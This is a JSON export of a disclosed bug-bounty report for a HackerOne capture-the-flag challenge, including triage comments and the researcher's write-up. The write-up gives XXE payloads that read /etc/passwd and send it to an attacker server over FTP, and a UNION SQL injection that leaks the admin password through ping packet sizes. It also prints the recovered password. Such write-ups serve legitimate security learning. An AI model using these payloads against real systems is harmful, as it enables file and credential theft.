{"id":1216085,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE2MDg1","url":"https://hackerone.com/reports/1216085","title":"ccc ctf ","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2021-06-03T07:47:03.844Z","submitted_at":"2021-06-03T07:47:03.889Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shamollash","url":"/shamollash","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":true,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-06-23T16:18:55.665Z","bug_reporter_agreed_on_going_public_at":"2021-06-22T18:19:51.293Z","team_member_agreed_on_going_public_at":"2021-06-23T16:18:55.569Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"██████████\n\nwill send  detailed report later\n\n## Impact\n\ncan get admin credentials","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-07-22T18:19:51.363Z","allow_singular_disclosure_after":-6981181.342749715,"singular_disclosure_allowed":true,"vote_count":12,"voters":["obsesif","ali","3x3s","h4x0r_dz","cryptographer","datsmed","chard213","rykkard","nehagaganmakhija","xmrhrx","and 2 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":72510,"asset_type":"URL","asset_identifier":"*.ccc.h1ctf.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":11979103,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for participating in the CCC CTF! ","automated_response":false,"created_at":"2021-06-03T19:45:57.120Z","updated_at":"2021-06-03T19:45:57.120Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":11979568,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi thank you for the game. For personal reasons, as I told Adam who should get in touch with you, if I ever get into the first five eligible for a money prize, I would prefer that the prize will be donated to a charity of your choice or the next eligible hacker if the first option is not possibile.\n\nThank you for your attention!","automated_response":false,"created_at":"2021-06-03T20:46:52.864Z","updated_at":"2021-06-03T20:46:52.864Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11979618,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Anyway, don't know why xml is displayed correctly in preview mode but not when the post is saved, sorry for that don't know how to fix it.","automated_response":false,"created_at":"2021-06-03T20:53:14.063Z","updated_at":"2021-06-03T20:53:14.063Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12160805,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @shamollash - Congrats on making it in the first 5 submissions *AND* you also submitted your write up at the same time! That's very impressive!\n\nIf you'd like to donate the money, you are welcome to donate it to #hackforgood. You can add them as a collaborator by adding them from the top of this report. The username for our charity is `hackforgood`. Otherwise, I'd have to work with our team to manually donate it for you. \n\nI have redacted and removed any references to the flag including some of your screenshots. If you chose to release your own write-up, please make sure to remove the flag from your post. \n\nThanks again and happy hacking!\n","automated_response":false,"created_at":"2021-06-17T21:46:34.169Z","updated_at":"2021-06-17T21:47:28.190Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12163047,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"automated_response":false,"created_at":"2021-06-18T06:43:04.363Z","updated_at":"2021-06-18T06:43:04.363Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"email":"hackforgood","genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12163055,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Thank you @nahamsec for you reply. I added hackforgood assigning 9.99 to them.\nAgain thank you for your initiatives and work.\n\nIf everything is ok on your side you may disclose the report.\nBye,\nEnrico.","automated_response":false,"created_at":"2021-06-18T06:45:11.938Z","updated_at":"2021-06-18T06:45:11.938Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12182819,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorJoined","message":"","automated_response":false,"created_at":"2021-06-21T06:17:04.367Z","updated_at":"2021-06-21T06:17:04.367Z","actor":{"username":"hackforgood","cleared":true,"url":"/hackforgood","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/eUkngfFEx8kiaNPVhKKJV1Un/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12196494,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see @hackforgood  joined the report. Is any other action expected on my side? Thank you.","automated_response":false,"created_at":"2021-06-21T19:35:47.046Z","updated_at":"2021-06-21T19:35:47.046Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12196913,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nope, as long as they have joined and you have given the right percentage to them, I can issue the bounty. Can you confirm?","automated_response":false,"created_at":"2021-06-21T20:42:29.021Z","updated_at":"2021-06-21T20:42:29.021Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12197078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I confirm, I gave them the maximum allowed: 9,99","automated_response":false,"created_at":"2021-06-21T21:05:24.183Z","updated_at":"2021-06-21T21:05:24.183Z","actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12210937,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"#","automated_response":false,"created_at":"2021-06-22T17:19:38.636Z","updated_at":"2021-06-22T17:19:38.636Z","actor":{"url":"/h1-ctf","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"h1-ctf"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"99.9","genius_execution_id":null,"team_handle":"h1-ctf","collaborator":{"username":"hackforgood","url":"/hackforgood"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12210938,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"#","automated_response":false,"created_at":"2021-06-22T17:19:38.903Z","updated_at":"2021-06-22T17:19:38.903Z","actor":{"url":"/h1-ctf","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"h1-ctf"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"0.1","genius_execution_id":null,"team_handle":"h1-ctf","collaborator":{"username":"shamollash","url":"/shamollash"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12210939,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-06-22T17:19:50.369Z","updated_at":"2021-06-22T17:19:50.369Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"shamollash","url":"/shamollash"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12211473,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you. Can you disclose the report ?","automated_response":false,"created_at":"2021-06-22T18:19:51.318Z","updated_at":"2021-06-22T18:19:51.318Z","first_to_agree":true,"actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12222441,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-23T16:18:55.588Z","updated_at":"2021-06-23T16:18:55.588Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":12222442,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-23T16:18:55.701Z","updated_at":"2021-06-23T16:18:55.701Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":57601,"category":"researcher","content":"We are given this website \n\n\thttps://ccc.h1ctf.com/\n\nWe can register a user which is assigned a user hash. In our case we got `8y399q` as user hash. Once logged in the page `/u/8y399q` just says:\n\n\n\t: Remote File list not found\n\n\nThe website points to a twitter account `https://twitter.com/DesignsCcc`. There we find a picture with a browser opened on the website we are attacking. One tab of the browser seems to point to: `/error_-_-_log.txt`\n\nWe are able to confirm that this file exists and it contains\n\n\tFile: https://h1-wfzfi4.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-y0c9ov.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-56qw4c.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\tFile: https://h1-6hin8w.s3.eu-west-2.amazonaws.com/files.xml Not Found\n\nOne of the buckets is intersting becaus it contains an hint towards XXE:\n\n```\nhttps://h1-cn9uhd.s3.eu-west-2.amazonaws.com/files.xml\n\n\u003c?xml version=\"1.0\" ?\u003e\n\u003c!DOCTYPE root [\n\u003c!ENTITY % ext SYSTEM \"http://patopirata.com/x\"\u003e %ext;\n]\u003e\n\u003cr\u003e\u003c/r\u003e\n```\n\nAfter a long struggle on many dead ends, and a couple of rickrollings we started wondering how can we make the site read a remote list of files. \n\nAt this point the key observation is that the log file above seems to suggest that the site will query a files.xml on AWS S3 with a predictable name:\n\n\th1-MYHASH.s3.eu-west-2.amazonaws.com/files.xml\n\n\nSo we went to AWS console and put an evil xml file in a public s3 bucket\n\n\n```\n    \u003c?xml version=\"1.0\" ?\u003e\n    \u003c!DOCTYPE r [\n    \u003c!ELEMENT r ANY \u003e\n    \u003c!ENTITY % sp SYSTEM \"http://MYSERVER:8080/ev.xml\"\u003e\n    %sp;\n    %param1;\n    ]\u003e\n   \u003cr\u003e\u0026exfil;\u003c/r\u003e\n```\n\nWe were able to confirm the XXE vulnerability and after a lot of trial and error, working with the external DTD (in order not to change the xml on S3) we came up with this payload in the external dtd `ev.xml`:\n\n\n```xml\n\u003c!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\"\u003e\n\u003c!ENTITY % param \"\u003c!ENTITY \u0026#37; exfil SYSTEM 'ftp://MYSERVER:2121/%data;'\u003e\"\u003e\n%param;\n%exfil;\n```\n\nFor exfiltration we are using the excellent tool `https://github.com/staaldraad/xxeserv`\n\n\nHaving php  (knowing the author of this challenge we suspected that), is very useful: we can work with filters to compress and encode data in order to easily exfiltrate even \"big\" files. \n\nIn particular we started looking at /etc/nginx/nginx.conf (mentioned by the twitter account of the developers) which contains usual include directives:\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\n...\n\tinclude /etc/nginx/conf.d/*.conf;\n\tinclude /etc/nginx/sites-enabled/*;\n}\n```\n\nThe default virtual host config `/etc/nginx/sites-enabled/default` is all commented out, so it's not the running configuration, but it contains an important clue:\n\n```\n#server {\n#    server_name ccc.h1ctf.com;\n#    root /var/www/app/public;\n#    index index.php;\n#    location / {\n#            try_files $uri $uri/ /index.php?$query_string;\n#    }\n#     location /2b5d2b11513d2c9b {\n#       proxy_pass http://127.0.0.1:8888;\n#     }\n#\n```\n\nMoving on to `ccc.h1ctf.com/2b5d2b11513d2c9b` we do some recon in there and find a `.git/HEAD` file. We cannot find much else in the .git directory apart from the configuration .git/config\n\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/ccc-labs/pinger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nWe now have the source code of the pinger service where we understand that we have to look at\n\n\thttps://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=XXX\n\nKey point is in the Ping model source code:\n\n`https://github.com/ccc-labs/pinger/blob/main/_pingercode_/models/Ping.php#L10`\n\n\n```\nclass Ping\n{\n\n    public static function send( $id ){\n        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';\n        $d = Db::connect()-\u003eprepare($sql);\n        $d-\u003eexecute();\n        //Confirm we've found a matching row in the database\n        if( $d-\u003erowCount() == 1 ){\n            $host = $d-\u003efetch();\n            $ip = $host[\"ip\"];\n            $packet_size = intval($host[\"packet_size\"]);\n            //make sure PING packet size between 1 and 65527\n            if( $packet_size \u003e 0 \u0026\u0026 $packet_size \u003c 65528 ) {\n                //check IP is a valid IPv4 Address\n                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {\n                    //SEND 4 PING PACKETS IN THE BACKGROUND\n                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  \u003e /dev/null \u0026');\n                }\n            }\n        }\n    }\n\n}\n```\n\n\nThe service is clarly vulnerable to SQL injection, but given the validation applied to `$packet_size` and `$ip` we are not able to do nothing but actually ping something. \n\n*But* we have some room in `$packet_size` to put ascii codes of relevant characters. So in the end a request like the one below will exifltrate Nth character of the admin password:\n\n```\nGET /2b5d2b11513d2c9b/api/ping?\nid=-1+union+all+select+1,'MYSERVER',ascii(substr(password,N,1))+from+user+where+username='admin'%23 HTTP/1.1\n```\n\nIn particular it will generate ICMP packets towards my server\n\n```\n10:17:39.290067 eth0  In  IP 18.216.97.43 \u003e x.y.z.w: ICMP echo request, id 223, seq 1, length 93\n```\n\nHere length 93 minus 8 for overhead will give ASCII 85 which is `U`, first character of the admin password. Repeating the exercise many times, sleeping one minute between request or, in my case, using a server with many different ip address will give the admin password `Ud79^1HHJ$W*IObaKdQgI`.\n\nLogging in the admin dashboard of pinger we get the flag:\n\n````\n████\n```","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":1428885,"username":"shamollash","name":"Enrico Cavalli","bio":"","cleared":false,"website":null,"location":"","created_at":"2020-12-14T13:07:33.656Z","url":"https://hackerone.com/shamollash","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}}]}